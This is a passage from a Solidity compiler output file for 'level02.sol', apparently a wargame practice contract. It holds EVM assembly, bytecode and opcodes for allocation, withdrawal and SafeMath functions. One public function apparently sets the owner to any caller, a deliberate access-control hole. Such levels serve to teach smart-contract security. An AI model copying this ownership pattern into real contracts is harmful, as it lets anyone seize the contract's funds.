    sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_35\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_35:\n        /* \"src/level02.sol\":845:887  allocator.transfer(allocations[allocator]) */\n      pop\n        /* \"src/level02.sol\":740:892  function sendAllocation(address payable allocator) public {... */\n      pop\n      jump\t// out\n        /* \"src/level02.sol\":626:736  function allocate() public payable {... */\n    tag_21:\n        /* \"src/level02.sol\":693:731  allocations[msg.sender].add(msg.value) */\n      tag_37\n        /* \"src/level02.sol\":721:730  msg.value */\n      callvalue\n        /* \"src/level02.sol\":693:704  allocations */\n      0x00\n        /* \"src/level02.sol\":693:716  allocations[msg.sender] */\n      dup1\n        /* \"src/level02.sol\":705:715  msg.sender */\n      caller\n        /* \"src/level02.sol\":693:716  allocations[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"src/level02.sol\":693:720  allocations[msg.sender].add */\n      tag_38\n      swap1\n        /* \"src/level02.sol\":693:731  allocations[msg.sender].add(msg.value) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_37:\n        /* \"src/level02.sol\":667:678  allocations */\n      0x00\n        /* \"src/level02.sol\":667:690  allocations[msg.sender] */\n      dup1\n        /* \"src/level02.sol\":679:689  msg.sender */\n      caller\n        /* \"src/level02.sol\":667:690  allocations[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"src/level02.sol\":667:731  allocations[msg.sender] = allocations[msg.sender].add(msg.value) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/level02.sol\":626:736  function allocate() public payable {... */\n      jump\t// out\n        /* \"src/level02.sol\":1000:1112  function allocatorBalance(address allocator) public view returns (uint) {... */\n    tag_25:\n        /* \"src/level02.sol\":1066:1070  uint */\n      0x00\n        /* \"src/level02.sol\":1085:1096  allocations */\n      dup1\n        /* \"src/level02.sol\":1085:1107  allocations[allocator] */\n      0x00\n        /* \"src/level02.sol\":1097:1106  allocator */\n      dup4\n        /* \"src/level02.sol\":1085:1107  allocations[allocator] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"src/level02.sol\":1078:1107  return allocations[allocator] */\n      swap1\n      pop\n        /* \"src/level02.sol\":1000:1112  function allocatorBalance(address allocator) public view returns (uint) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":867:1043  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_38:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":925:932  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":944:953  uint256 c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":960:961  b */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":956:957  a */\n      dup5\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":956:961  a + b */\n      add\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":944:961  uint256 c = a + b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":984:985  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":979:980  c */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":979:985  c >= a */\n      lt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":971:1017  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_41\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_41:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":1035:1036  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":1028:1036  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":867:1043  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220cacaf5162d0306ee26dbb15e9925609c5c425f45ba9d0d00d5b4a4906184860064736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506105da806100206000396000f3fe6080604052600436106100555760003560e01c80636fab5ddf1461005a5780638aa96f38146100645780638da5cb5b1461007b578063a2dea26f146100d2578063abaa991614610123578063ffd40b561461012d575b600080fd5b610062610192565b005b34801561007057600080fd5b5061007961023a565b005b34801561008757600080fd5b50610090610346565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100de57600080fd5b50610121600480360360208110156100f557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061036c565b005b61012b61043f565b005b34801561013957600080fd5b5061017c6004803603602081101561015057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104d4565b6040518082815260200191505060405180910390f35b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034600080600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f63616c6c6572206973206e6f7420746865206f776e657200000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610343573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054116103b757600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549081150290604051600060405180830381858888f1935050505015801561043b573d6000803e3d6000fd5b5050565b610490346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461051c90919063ffffffff16565b6000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561059a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220cacaf5162d0306ee26dbb15e9925609c5c425f45ba9d0d00d5b4a4906184860064736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5DA DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x55 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FAB5DDF EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x8AA96F38 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x7B JUMPI DUP1 PUSH4 0xA2DEA26F EQ PUSH2 0xD2 JUMPI DUP1 PUSH4 0xABAA9916 EQ PUSH2 0x123 JUMPI DUP1 PUSH4 0xFFD40B56 EQ PUSH2 0x12D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x62 PUSH2 0x192 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x79 PUSH2 0x23A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x87 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x90 PUSH2 0x346 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x121 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x36C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x12B PUSH2 0x43F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x139 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x17C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x150 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x0 DUP1 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x2FD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x17 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x63616C6C6572206973206E6F7420746865206F776E6572000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x343 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT PUSH2 0x3B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x43B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x490 CALLVALUE PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x51C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x59A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCA 0xCA CREATE2 AND 0x2D SUB MOD 0xEE 0x26 0xDB 0xB1 0x5E SWAP10 0x25 PUSH1 0x9C 0x5C TIMESTAMP 0x5F GASLIMIT 0xBA SWAP14 0xD STOP 0xD5 0xB4 LOG4 SWAP1 PUSH2 0x8486 STOP PUSH5 0x736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "228:886:1:-:0;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;228:886:1;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106100555760003560e01c80636fab5ddf1461005a5780638aa96f38146100645780638da5cb5b1461007b578063a2dea26f146100d2578063abaa991614610123578063ffd40b561461012d575b600080fd5b610062610192565b005b34801561007057600080fd5b5061007961023a565b005b34801561008757600080fd5b50610090610346565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100de57600080fd5b50610121600480360360208110156100f557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061036c565b005b61012b61043f565b005b34801561013957600080fd5b5061017c6004803603602081101561015057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104d4565b6040518082815260200191505060405180910390f35b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034600080600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f63616c6c6572206973206e6f7420746865206f776e657200000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610343573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054116103b757600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549081150290604051600060405180830381858888f1935050505015801561043b573d6000803e3d6000fd5b5050565b610490346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461051c90919063ffffffff16565b6000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561059a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220cacaf5162d0306ee26dbb15e9925609c5c425f45ba9d0d00d5b4a4906184860064736f6c63430006000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x55 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FAB5DDF EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x8AA96F38 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x7B JUMPI DUP1 PUSH4 0xA2DEA26F EQ PUSH2 0xD2 JUMPI DUP1 PUSH4 0xABAA9916 EQ PUSH2 0x123 JUMPI DUP1 PUSH4 0xFFD40B56 EQ PUSH2 0x12D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x62 PUSH2 0x192 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x79 PUSH2 0x23A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x87 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x90 PUSH2 0x346 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x121 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x36C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x12B PUSH2 0x43F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x139 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x17C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x150 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x0 DUP1 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x2FD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x17 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x63616C6C6572206973206E6F7420746865206F776E6572000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x343 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT PUSH2 0x3B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 